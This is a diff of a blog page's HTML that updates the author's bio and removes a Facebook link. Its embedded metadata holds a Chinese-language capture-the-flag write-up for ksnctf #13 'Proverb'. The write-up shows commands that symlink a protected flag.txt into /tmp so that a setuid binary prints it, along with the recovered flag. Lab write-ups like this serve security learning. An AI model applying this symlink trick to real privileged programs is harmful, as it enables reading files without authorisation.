@@ -19,7 +19,7 @@
             <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
         
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"ln -s\n\n\n登入 SSH 以後，目錄底下有 proverb 執行檔以及沒有權限讀取的 flag.txt。執行 proverb 後發現，會讀取 proverb.txt 中任一行並且印出來。\n12345678[q13@localhost ~]$ lltotal 28-r-------- 6 q13a q13a    22 Jun  1  2012 flag.txt---s--x--x 7 q13a q13a 14439 Jun  1  2012 proverb-r--r--r-- 2 root root   755 Jun  1  2012 proverb.txt-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt[q13@localhost ~]$ ./proverbFire is a good servant but a bad master.\n\n有 /tmp 路徑可以讀寫，設想如果使用 ln -s  建立檔案連結來讓 proverb 讀取 flag.txt，flag 就可以順利拿到。\n12345678[q13@localhost ~]$ mkdir /tmp/the0[q13@localhost ~]$ ln -s ~/flag.txt /tmp/the0/proverb.txt[q13@localhost ~]$ cd /tmp/the0[q13@localhost the0]$ lltotal 0lrwxrwxrwx 1 q13 q13 18 Aug  6 17:16 proverb.txt -&gt; /home/q13/flag.txt[q13@localhost the0]$ ~/proverbFLAG_XoK9PzskYedj/T&amp;B","dateCreated":"2018-08-06T15:45:18+00:00","dateModified":"2022-12-10T18:57:10+00:00","datePublished":"2018-08-06T15:45:18+00:00","description":"ln -s","headline":"ksnctf #13 Proverb","image":["ksnctf.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/","keywords":"Writeups","thumbnailUrl":"ksnctf.png"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"ln -s\n\n\n登入 SSH 以後，目錄底下有 proverb 執行檔以及沒有權限讀取的 flag.txt。執行 proverb 後發現，會讀取 proverb.txt 中任一行並且印出來。\n12345678[q13@localhost ~]$ lltotal 28-r-------- 6 q13a q13a    22 Jun  1  2012 flag.txt---s--x--x 7 q13a q13a 14439 Jun  1  2012 proverb-r--r--r-- 2 root root   755 Jun  1  2012 proverb.txt-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt[q13@localhost ~]$ ./proverbFire is a good servant but a bad master.\n\n有 /tmp 路徑可以讀寫，設想如果使用 ln -s  建立檔案連結來讓 proverb 讀取 flag.txt，flag 就可以順利拿到。\n12345678[q13@localhost ~]$ mkdir /tmp/the0[q13@localhost ~]$ ln -s ~/flag.txt /tmp/the0/proverb.txt[q13@localhost ~]$ cd /tmp/the0[q13@localhost the0]$ lltotal 0lrwxrwxrwx 1 q13 q13 18 Aug  6 17:16 proverb.txt -&gt; /home/q13/flag.txt[q13@localhost the0]$ ~/proverbFLAG_XoK9PzskYedj/T&amp;B","dateCreated":"2018-08-06T15:45:18+00:00","dateModified":"2022-12-10T18:57:10+00:00","datePublished":"2018-08-06T15:45:18+00:00","description":"ln -s","headline":"ksnctf #13 Proverb","image":["ksnctf.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/","keywords":"Writeups","thumbnailUrl":"ksnctf.png"}</script>
     
     <meta name="description" content="ln -s">
 <meta property="og:type" content="blog">
@@ -122,7 +122,7 @@
                 </a>
                 <h4 class="sidebar-profile-name">Theo Chen</h4>
                 
-                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting<br /><br />Ingress Enlightened Agent</p>
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
 </h5>
                 
             </div>
@@ -233,22 +233,6 @@
                         >
                         <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.facebook.com/profile.php?id=100009076420659"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
                     </a>
             </li>
             
@@ -630,7 +614,7 @@
         
             <h4 id="about-card-name">Theo Chen</h4>
         
-            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting<br /><br />Ingress Enlightened Agent</p>
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
 </div>
         
         
